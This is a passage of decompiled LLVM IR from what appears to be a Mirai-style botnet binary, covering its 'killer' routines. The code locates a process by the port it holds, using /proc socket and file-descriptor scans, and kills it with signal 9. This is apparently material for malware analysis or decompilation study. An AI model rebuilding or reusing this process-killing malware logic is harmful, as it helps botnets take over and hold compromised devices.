  %v8_de1c = icmp sgt i32 %v1_de0c, 1
  br i1 %v8_de1c, label %dec_label_pc_de0c, label %dec_label_pc_de20.loopexit

dec_label_pc_de20.loopexit:                       ; preds = %dec_label_pc_de0c
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_de20.loopexit, %entry
  %v1_de2c = phi i32 [ %v2_de18, %dec_label_pc_de20.loopexit ], [ 0, %entry ]
  %v0_de20 = phi i32 [ %v1_de0c, %dec_label_pc_de20.loopexit ], [ %arg3, %entry ]
  %v7_de20 = icmp eq i32 %v0_de20, 1
  br i1 %v7_de20, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_de20
  br label %bb19

bb:                                               ; preds = %dec_label_pc_de20
  %v1_de24 = load i32, i32* @r1, align 4
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v4_de24 = zext i8 %v3_de24 to i32
  %v3_de2c = add i32 %v4_de24, %v1_de2c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_de54 = phi i32 [ %v1_de2c, %.thread ], [ %v3_de2c, %bb ]
  %v0_de34 = mul i32 %v3_ddf8, 65536
  %v3_de34 = udiv i32 %v0_de34, 65536
  %v3_de38 = urem i32 %v3_ddfc, 65536
  %v4_de40 = udiv i32 %v3_ddf8, 65536
  %v2_de3c = add nuw nsw i32 %v3_de38, %v4_de40
  %v5_de40 = add nuw nsw i32 %v2_de3c, %v3_de34
  %v1_de44 = add i32 %arg1, 9
  %v2_de44 = inttoptr i32 %v1_de44 to i8*
  %v3_de44 = load i8, i8* %v2_de44, align 1
  %v4_de44 = zext i8 %v3_de44 to i32
  %v4_de48 = udiv i32 %v3_ddfc, 65536
  %v3_de50 = mul nuw nsw i32 %v4_de44, 256
  %v5_de48 = add i32 %v4_de48, %arg2
  %v2_de4c = add i32 %v5_de48, %v1_de54
  %v2_de54 = add i32 %v2_de4c, %v5_de40
  %v2_de58 = add i32 %v2_de54, %v3_de50
  %tmp = icmp ult i32 %v2_de58, 65536
  br i1 %tmp, label %dec_label_pc_de78, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %bb19, %dec_label_pc_de64
  %v2_de6c5 = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706.in = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706 = udiv i32 %v3_de706.in, 65536
  %v3_de68 = urem i32 %v2_de6c5, 65536
  %v2_de6c = add nuw nsw i32 %v3_de68, %v3_de706
  %tmp20 = icmp ult i32 %v2_de6c, 65536
  br i1 %tmp20, label %dec_label_pc_de78.loopexit, label %dec_label_pc_de64

dec_label_pc_de78.loopexit:                       ; preds = %dec_label_pc_de64
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de78.loopexit, %bb19
  %v0_de78 = phi i32 [ %v2_de6c, %dec_label_pc_de78.loopexit ], [ %v2_de58, %bb19 ]
  %v1_de78 = urem i32 %v0_de78, 65536
  %v3_de80 = xor i32 %v1_de78, 65535
  ret i32 %v3_de80

; uselistorder directives
  uselistorder i32 %v2_de6c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_de58, { 3, 0, 2, 1 }
  uselistorder i32 %v1_de2c, { 1, 0 }
  uselistorder i32 %v5_de10, { 1, 0 }
  uselistorder i32 %v0_de10, { 1, 0 }
  uselistorder i32 %v3_ddf8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_de98 = load i32, i32* @global_var_235f0.102, align 4
  %v2_dea0 = call i32 @kill(i32 %v2_de98, i32 9)
  ret i32 %v2_dea0
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_deb4 = load i32, i32* @r4, align 4
  %v6_deb4 = load i32, i32* @r5, align 4
  %v9_deb4 = load i32, i32* @r6, align 4
  %v12_deb4 = load i32, i32* @r7, align 4
  %v15_deb4 = load i32, i32* @r8, align 4
  %v18_deb4 = load i32, i32* @sb, align 4
  %v21_deb4 = load i32, i32* @sl, align 4
  %v24_deb4 = load i32, i32* @fp, align 4
  %v27_deb4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_ded0 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_ded0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_defc = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_defc, i32* @fp, align 4
  %v4_df08 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_df0c = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_df0c, i32* @sl, align 4
  %v0_df10 = load i32, i32* @r5, align 4
  %v3_df1c = bitcast i32* %stack_var_-8777 to i8*
  %v4_df1c = call i32 @__GI_memset(i8* %v3_df1c, i32 %v0_df10, i32 4096)
  %v0_df24 = load i32, i32* @r5, align 4
  %v3_df30 = bitcast i32* %stack_var_-4681 to i8*
  %v4_df30 = call i32 @__GI_memset(i8* %v3_df30, i32 %v0_df24, i32 4096)
  %v2_df34 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_df34, i32* @sb, align 4
  %v0_df38 = load i32, i32* %r4.global-to-local, align 4
  %v3_df38 = udiv i32 %v0_df38, 256
  %v1_df3c = urem i32 %v0_df38, 256
  store i32 %v1_df3c, i32* @r4, align 4
  %v3_df4c = trunc i32 %v3_df38 to i8
  %v4_df4c = call i32 @util_itoa(i8 %v3_df4c, i32 16, i32 %v2_df34)
  %v2_df54 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_df58 = icmp eq i32 %v2_df54, 2
  br i1 %v7_df58, label %dec_label_pc_e404, label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %entry, %dec_label_pc_e404
  %v1_df64 = call i32 @table_unlock_val(i32 6)
  %v1_df6c = call i32 @table_unlock_val(i32 7)
  %v1_df74 = call i32 @table_unlock_val(i32 8)
  %v1_df7c = call i32 @table_unlock_val(i32 9)
  %v0_df80 = load i32, i32* @r5, align 4
  %v2_df88 = inttoptr i32 %v0_df80 to i32*
  %v3_df88 = call i32 @table_retrieve_val(i32 9, i32* %v2_df88)
  %v0_df8c = load i32, i32* @r5, align 4
  %v2_df90 = call i32 @__libc_open(i32 %v3_df88, i32 %v0_df8c)
  %v7_df94 = icmp eq i32 %v2_df90, -1
  store i32 %v2_df90, i32* @r8, align 4
  br i1 %v7_df94, label %bb, label %dec_label_pc_dfa4.preheader

bb:                                               ; preds = %dec_label_pc_df60
  %v1_df9c = load i32, i32* @r5, align 4
  store i32 %v1_df9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df60
  %v4_dfb057 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_df90)
  %v2_dfb459 = icmp eq i32 %v4_dfb057, 0
  br i1 %v2_dfb459, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc.lr.ph

dec_label_pc_dfbc.lr.ph:                          ; preds = %dec_label_pc_dfa4.preheader
  %v2_e004 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbc.lr.ph, %dec_label_pc_dfa4.backedge
  %v3_dfc0 = load i8, i8* %stack_var_-585, align 1
  %v4_dfc0 = sext i8 %v3_dfc0 to i32
  store i32 %v4_dfc0, i32* @r3, align 4
  %v2_dfc4 = icmp eq i8 %v3_dfc0, 0
  br i1 %v2_dfc4, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_dfbc
  %v8_dfc8 = icmp eq i8 %v3_dfc0, 58
  br i1 %v8_dfc8, label %.thread8, label %dec_label_pc_dfdc

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_dff4

bb134:                                            ; preds = %dec_label_pc_dfbc
  br label %dec_label_pc_dff4

dec_label_pc_dfdc:                                ; preds = %bb133
  %v1_dfe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb135, %dec_label_pc_dfdc
  %v0_dfe0 = phi i32 [ %v1_dfe0, %bb135 ], [ 0, %dec_label_pc_dfdc ]
  %v1_dfe0 = add i32 %v0_dfe0, 1
  %v2_dfe4 = add i32 %v1_dfe0, %v1_dfe4.pre
  %v3_dfe4 = inttoptr i32 %v2_dfe4 to i8*
  %v4_dfe4 = load i8, i8* %v3_dfe4, align 1
  %v6_dfe4 = zext i8 %v4_dfe4 to i32
  store i32 %v6_dfe4, i32* @r3, align 4
  %v2_dfe8 = icmp eq i8 %v4_dfe4, 0
  br i1 %v2_dfe8, label %dec_label_pc_dff4, label %bb135

bb135:                                            ; preds = %dec_label_pc_dfe0
  %v8_dfec = icmp eq i8 %v4_dfe4, 58
  br i1 %v8_dfec, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfe0, %bb135, %bb134, %.thread8
  %v1_e020 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_dfe0, %bb135 ], [ %v1_dfe0, %dec_label_pc_dfe0 ]
  %v0_dff4 = phi i32 [ %v4_dfc0, %.thread8 ], [ %v4_dfc0, %bb134 ], [ %v6_dfe4, %bb135 ], [ %v6_dfe4, %dec_label_pc_dfe0 ]
  %v2_dff4 = icmp eq i32 %v0_dff4, 0
  br i1 %v2_dff4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_dffc

dec_label_pc_dfa4.backedge:                       ; preds = %dec_label_pc_dff4, %dec_label_pc_e0c4, %dec_label_pc_e110, %dec_label_pc_e040
  %v0_dfac = load i32, i32* @r8, align 4
  %v4_dfb0 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dfac)
  %v2_dfb4 = icmp eq i32 %v4_dfb0, 0
  br i1 %v2_dfb4, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dff4
  %v1_e000 = add i32 %v1_e020, 2
  %v2_e008 = add i32 %v1_e000, %v2_e004
  %v1_e00c = add i32 %v2_e008, -545
  %v2_e00c = inttoptr i32 %v1_e00c to i8*
  %v3_e00c = load i8, i8* %v2_e00c, align 1
  %v2_e010 = icmp eq i8 %v3_e00c, 0
  br i1 %v2_e010, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_dffc
  %v8_e014 = icmp eq i8 %v3_e00c, 32
  br i1 %v8_e014, label %.thread13, label %dec_label_pc_e020

.thread13:                                        ; preds = %bb136
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

bb137:                                            ; preds = %dec_label_pc_dffc
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

dec_label_pc_e020:                                ; preds = %bb136
  %v0_e020 = load i32, i32* @r6, align 4
  %v2_e020 = add i32 %v0_e020, %v1_e020
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %bb138, %dec_label_pc_e020
  %v0_e03416 = phi i32 [ %v1_e034, %bb138 ], [ %v1_e000, %dec_label_pc_e020 ]
  %v0_e03818 = phi i32 [ %v1_e038, %bb138 ], [ %v2_e020, %dec_label_pc_e020 ]
  %v1_e028 = add i32 %v0_e03818, 3
  %v2_e028 = inttoptr i32 %v1_e028 to i8*
  %v3_e028 = load i8, i8* %v2_e028, align 1
  %v2_e02c = icmp eq i8 %v3_e028, 0
  br i1 %v2_e02c, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_e028
  %v1_e03417 = add i32 %v0_e03416, 1
  store i32 %v1_e03417, i32* @r5, align 4
  br label %dec_label_pc_e040

bb138:                                            ; preds = %dec_label_pc_e028
  %v8_e030 = icmp eq i8 %v3_e028, 32
  %v1_e034 = add i32 %v0_e03416, 1
  store i32 %v1_e034, i32* @r5, align 4
  %v1_e038 = add i32 %v0_e03818, 1
  br i1 %v8_e030, label %dec_label_pc_e040, label %dec_label_pc_e028

dec_label_pc_e040:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_e04c = phi i32 [ %v1_e03417, %.thread15 ], [ %v1_e000, %.thread13 ], [ %v1_e000, %bb137 ], [ %v1_e034, %bb138 ]
  %v0_e040 = load i32, i32* @r6, align 4
  %v2_e040 = add i32 %v0_e040, %v1_e000
  store i32 %v2_e040, i32* @r4, align 4
  %v2_e04c = add i32 %v1_e04c, %v2_e004
  store i32 0, i32* @r7, align 4
  %v3_e054 = add i32 %v2_e04c, -545
  %v4_e054 = inttoptr i32 %v3_e054 to i8*
  store i8 0, i8* %v4_e054, align 1
  %v0_e058 = load i32, i32* @r4, align 4
  %v1_e05c = inttoptr i32 %v0_e058 to i8*
  %v2_e05c = call i32 @util_strlen(i8* %v1_e05c)
  store i32 %v2_e05c, i32* @r1, align 4
  %v0_e068 = load i32, i32* @r4, align 4
  %v3_e06c = inttoptr i32 %v0_e068 to i8*
  %v4_e06c = call i32 @util_stristr(i8* %v3_e06c, i32 %v2_e05c, i32 %v2_df34)
  %v7_e070 = icmp eq i32 %v4_e06c, -1
  br i1 %v7_e070, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e08c.preheader

dec_label_pc_e08c.preheader:                      ; preds = %dec_label_pc_e040
  %v1_e074 = load i32, i32* @r7, align 4
  %v1_e078 = load i32, i32* @r6, align 4
  %v2_e078 = load i32, i32* @r5, align 4
  %v3_e078 = add i32 %v2_e078, %v1_e078
  store i32 %v1_e074, i32* @lr, align 4
  %v1_e08c49 = add i32 %v3_e078, 2
  %v2_e08c50 = inttoptr i32 %v1_e08c49 to i8*
  %v3_e08c51 = load i8, i8* %v2_e08c50, align 1
  %v4_e08c52 = zext i8 %v3_e08c51 to i32
  store i32 %v4_e08c52, i32* @r3, align 4
  %v2_e09053 = icmp eq i8 %v3_e08c51, 0
  %v1_e09455 = add i32 %v2_e078, 2
  br i1 %v2_e09053, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_e08c.preheader, %dec_label_pc_e08c.backedge
  %v0_e0c484 = phi i32 [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e0ac.pr = phi i32 [ %v0_e0ac.pr71, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e3d8 = phi i32 [ %v0_e3d874, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e09479 = phi i32 [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v1_e09455, %dec_label_pc_e08c.preheader ]
  %v0_e0bc = phi i32 [ %v0_e08c, %dec_label_pc_e08c.backedge ], [ %v3_e078, %dec_label_pc_e08c.preheader ]
  %v1_e0a0 = phi i32 [ %v4_e08c, %dec_label_pc_e08c.backedge ], [ %v4_e08c52, %dec_label_pc_e08c.preheader ]
  %v7_e09c = icmp eq i32 %v1_e0a0, 9
  br i1 %v7_e09c, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_e09c
  %v8_e0a0 = icmp eq i32 %v1_e0a0, 32
  br i1 %v8_e0a0, label %.thread27, label %dec_label_pc_e0ac

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_e0b8

bb140:                                            ; preds = %dec_label_pc_e09c
  br label %dec_label_pc_e0b8

dec_label_pc_e0ac:                                ; preds = %bb139
  %v7_e0ac = icmp eq i32 %v0_e0ac.pr, 1
  br i1 %v7_e0ac, label %dec_label_pc_e3d8, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e3d8, %dec_label_pc_e0ac
  %v0_e0b876 = phi i32 [ %v1_e3d8, %dec_label_pc_e3d8 ], [ %v0_e3d8, %dec_label_pc_e0ac ]
  br label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %bb140, %.thread27, %dec_label_pc_e0b4
  %v0_e0b8 = phi i32 [ %v0_e3d8, %.thread27 ], [ %v0_e3d8, %bb140 ], [ %v0_e0b876, %dec_label_pc_e0b4 ]
  %v0_e0ac.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_e0b4 ]
  %v7_e0c0 = icmp sgt i32 %v0_e0b8, 6
  br i1 %v7_e0c0, label %dec_label_pc_e0c4, label %dec_label_pc_e08c.backedge

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e08c.backedge, %dec_label_pc_e0b8, %dec_label_pc_e08c.preheader
  %v1_e114 = phi i32 [ %v1_e09455, %dec_label_pc_e08c.preheader ], [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v0_e09479, %dec_label_pc_e0b8 ]
  %v0_e0c4 = phi i32 [ %v1_e074, %dec_label_pc_e08c.preheader ], [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v2_e0c4 = icmp eq i32 %v0_e0c4, 0
  br i1 %v2_e0c4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v2_e0d8 = add i32 %v1_e114, %v2_e004
  %v1_e0dc = add i32 %v2_e0d8, -545
  %v2_e0dc = inttoptr i32 %v1_e0dc to i8*
  %v3_e0dc = load i8, i8* %v2_e0dc, align 1
  %v2_e0e0 = icmp eq i8 %v3_e0dc, 0
  br i1 %v2_e0e0, label %dec_label_pc_e110, label %bb141

bb141:                                            ; preds = %dec_label_pc_e0d0
  %v8_e0e4 = icmp eq i8 %v3_e0dc, 32
  br i1 %v8_e0e4, label %dec_label_pc_e110, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb141
  %v2_e0ec = add i32 %v1_e114, %v1_e078
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %bb142, %dec_label_pc_e0ec
  %v0_e0fc30 = phi i32 [ %v1_e0fc, %bb142 ], [ %v1_e114, %dec_label_pc_e0ec ]
  %v0_e0f0 = phi i32 [ %v1_e0f0, %bb142 ], [ %v2_e0ec, %dec_label_pc_e0ec ]
  %v1_e0f0 = add i32 %v0_e0f0, 1
  %v2_e0f0 = inttoptr i32 %v1_e0f0 to i8*
  %v3_e0f0 = load i8, i8* %v2_e0f0, align 1
  %v2_e0f4 = icmp eq i8 %v3_e0f0, 0
  br i1 %v2_e0f4, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_e0f0
  %v1_e0fc31 = add i32 %v0_e0fc30, 1
  br label %dec_label_pc_e104

bb142:                                            ; preds = %dec_label_pc_e0f0
  %v8_e0f8 = icmp eq i8 %v3_e0f0, 32
  %v1_e0fc = add i32 %v0_e0fc30, 1
  br i1 %v8_e0f8, label %dec_label_pc_e104, label %dec_label_pc_e0f0

dec_label_pc_e104:                                ; preds = %bb142, %.thread29
  %v1_e10c = phi i32 [ %v1_e0fc31, %.thread29 ], [ %v1_e0fc, %bb142 ]
  %v2_e10c = add i32 %v1_e10c, %v2_e004
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0d0, %bb141, %dec_label_pc_e104
  %v2_e11c = phi i32 [ %v2_e0d8, %dec_label_pc_e0d0 ], [ %v2_e0d8, %bb141 ], [ %v2_e10c, %dec_label_pc_e104 ]
  %v2_e114 = add i32 %v1_e114, %v1_e078
  store i32 %v2_e114, i32* @r4, align 4
  %v3_e11c = add i32 %v2_e11c, -545
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  store i8 0, i8* %v4_e11c, align 1
  %v1_e120 = inttoptr i32 %v2_e114 to i8*
  %v2_e120 = call i32 @util_strlen(i8* %v1_e120)
  %v8_e128 = icmp sgt i32 %v2_e120, 15
  br i1 %v8_e128, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e12c

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e110
  %v0_e130 = load i32, i32* @r4, align 4
  %v2_e134 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e134, i32* @r0, align 4
  %v2_e138 = bitcast i32* %stack_var_-56 to i8*
  %v3_e138 = call i32 @util_strcpy(i8* %v2_e138, i32 %v0_e130)
  br label %dec_label_pc_e13c

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_dfa4.backedge, %dec_label_pc_dfa4.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e12c
  %v1_e14c.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e13c.loopexit ], [ %v2_e138, %dec_label_pc_e12c ]
  %v2_e148.pre-phi = phi i32 [ %.pre, %dec_label_pc_e13c.loopexit ], [ %v2_e134, %dec_label_pc_e12c ]
  %v0_e13c = load i32, i32* @r8, align 4
  %v1_e140 = call i32 @__GI___libc_close(i32 %v0_e13c)
  %v2_e14c = call i32 @util_strlen(i8* %v1_e14c.pre-phi)
  store i32 %v2_e14c, i32* @r4, align 4
  %v2_e150 = icmp eq i32 %v2_e14c, 0
  br i1 %v2_e150, label %dec_label_pc_e3a8, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e13c
  %v3_e164 = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e168 = call i32 @__GI_opendir(i32 %v3_e164)
  store i32 %v1_e168, i32* @sb, align 4
  %v2_e16c = icmp eq i32 %v1_e168, 0
  br i1 %v2_e16c, label %dec_label_pc_e39c, label %dec_label_pc_e17c.preheader

dec_label_pc_e17c.preheader:                      ; preds = %dec_label_pc_e15c
  store i32 0, i32* @r5, align 4
  %v1_e18044 = inttoptr i32 %v1_e168 to i32*
  %v2_e18045 = call i32 @__GI_readdir(i32* %v1_e18044)
  %v2_e18447 = icmp eq i32 %v2_e18045, 0
  br i1 %v2_e18447, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e17c.loopexit:                       ; preds = %dec_label_pc_e194, %dec_label_pc_e1a4, %dec_label_pc_e210
  %v0_e17c = load i32, i32* @sb, align 4
  %v1_e180 = inttoptr i32 %v0_e17c to i32*
  %v2_e180 = call i32 @__GI_readdir(i32* %v1_e180)
  %v2_e184 = icmp eq i32 %v2_e180, 0
  br i1 %v2_e184, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e18c.preheader:                      ; preds = %dec_label_pc_e17c.preheader, %dec_label_pc_e17c.loopexit
  %v0_e19492 = phi i32 [ %v2_e180, %dec_label_pc_e17c.loopexit ], [ %v2_e18045, %dec_label_pc_e17c.preheader ]
  br label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e18c.preheader, %dec_label_pc_e378
  %v0_e1ac = phi i32 [ %v0_e19492, %dec_label_pc_e18c.preheader ], [ %v2_e384, %dec_label_pc_e378 ]
  %v0_e18c = load i32, i32* @r5, align 4
  %v2_e18c = icmp eq i32 %v0_e18c, 0
  br i1 %v2_e18c, label %dec_label_pc_e194, label %dec_label_pc_e390

dec_label_pc_e194:                                ; preds = %dec_label_pc_e18c
  %v1_e194 = add i32 %v0_e1ac, 11
  %v2_e194 = inttoptr i32 %v1_e194 to i8*
  %v3_e194 = load i8, i8* %v2_e194, align 1
  %v4_e194 = zext i8 %v3_e194 to i32
  %v1_e198 = add nsw i32 %v4_e194, -48
  %tmp = icmp ugt i32 %v1_e198, 9
  br i1 %tmp, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e194
  store i32 %v1_e194, i32* @r7, align 4
  %v3_e1b0 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e1bc = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e1b0)
  %v2_e1c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1c8 = load i32, i32* @r7, align 4
  %v1_e1cc = load i32, i32* @sl, align 4
  %v2_e1cc = add i32 %v1_e1cc, %v2_e1c4
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = inttoptr i32 %v2_e1cc to i8*
  %v3_e1d0 = call i32 @util_strcpy(i8* %v2_e1d0, i32 %v0_e1c8)
  %v2_e1d8 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1dc = load i32, i32* @r5, align 4
  store i32 %v2_e1d8, i32* @r4, align 4
  %v2_e1e8 = inttoptr i32 %v0_e1dc to i32*
  %v3_e1e8 = call i32 @table_retrieve_val(i32 7, i32* %v2_e1e8)
  %v0_e1f0 = load i32, i32* @r4, align 4
  %v1_e1f0 = load i32, i32* @sl, align 4
  %v2_e1f0 = add i32 %v1_e1f0, %v0_e1f0
  store i32 %v2_e1f0, i32* @r0, align 4
  %v2_e1f4 = inttoptr i32 %v2_e1f0 to i8*
  %v3_e1f4 = call i32 @util_strcpy(i8* %v2_e1f4, i32 %v3_e1e8)
  %v3_e204 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e208 = icmp eq i32 %v3_e204, -1
  br i1 %v7_e208, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1a4
  %v0_e210 = load i32, i32* @r5, align 4
  %v2_e218 = inttoptr i32 %v0_e210 to i32*
  %v3_e218 = call i32 @table_retrieve_val(i32 6, i32* %v2_e218)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e224 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e218)
  %v2_e22c = call i32 @util_strlen(i8* %v3_df30)
  %v0_e230 = load i32, i32* @r7, align 4
  %v1_e234 = load i32, i32* @sl, align 4
  %v2_e234 = add i32 %v1_e234, %v2_e22c
  store i32 %v2_e234, i32* @r0, align 4
  %v2_e238 = inttoptr i32 %v2_e234 to i8*
  %v3_e238 = call i32 @util_strcpy(i8* %v2_e238, i32 %v0_e230)
  %v2_e240 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e244 = load i32, i32* @r5, align 4
  store i32 %v2_e240, i32* @r4, align 4
  %v2_e250 = inttoptr i32 %v0_e244 to i32*
  %v3_e250 = call i32 @table_retrieve_val(i32 8, i32* %v2_e250)
  %v0_e258 = load i32, i32* @r4, align 4
  %v1_e258 = load i32, i32* @sl, align 4
  %v2_e258 = add i32 %v1_e258, %v0_e258
  store i32 %v2_e258, i32* @r0, align 4
  %v2_e25c = inttoptr i32 %v2_e258 to i8*
  %v3_e25c = call i32 @util_strcpy(i8* %v2_e25c, i32 %v3_e250)
  %v1_e264 = call i32 @__GI_opendir(i32 %v2_df0c)
  store i32 %v1_e264, i32* @r8, align 4
  %v2_e268 = icmp eq i32 %v1_e264, 0
  br i1 %v2_e268, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e270.preheader

dec_label_pc_e270.preheader:                      ; preds = %dec_label_pc_e210
  %v1_e27439 = inttoptr i32 %v1_e264 to i32*
  %v2_e27440 = call i32 @__GI_readdir(i32* %v1_e27439)
  store i32 %v2_e27440, i32* @r6, align 4
  %v2_e27842 = icmp eq i32 %v2_e27440, 0
  br i1 %v2_e27842, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e270.loopexit:                       ; preds = %dec_label_pc_e290, %dec_label_pc_e328
  %v0_e270 = load i32, i32* @r8, align 4
  %v1_e274 = inttoptr i32 %v0_e270 to i32*
  %v2_e274 = call i32 @__GI_readdir(i32* %v1_e274)
  store i32 %v2_e274, i32* @r6, align 4
  %v2_e278 = icmp eq i32 %v2_e274, 0
  br i1 %v2_e278, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e288thread-pre-split:                ; preds = %dec_label_pc_e270.preheader, %dec_label_pc_e270.loopexit
  %v0_e288.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288thread-pre-split, %dec_label_pc_e350
  %v0_e288 = phi i32 [ %v0_e288.pr, %dec_label_pc_e288thread-pre-split ], [ 1, %dec_label_pc_e350 ]
  %v2_e288 = icmp eq i32 %v0_e288, 0
  br i1 %v2_e288, label %dec_label_pc_e290, label %dec_label_pc_e378

dec_label_pc_e290:                                ; preds = %dec_label_pc_e288
  %v2_e290 = call i32 @util_zero(i32 %v2_defc, i32 4096)
  %v0_e294 = load i32, i32* @r5, align 4
  %v2_e29c = inttoptr i32 %v0_e294 to i32*
  %v3_e29c = call i32 @table_retrieve_val(i32 6, i32* %v2_e29c)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e2a8 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e29c)
  %v2_e2b0 = call i32 @util_strlen(i8* %v3_df30)
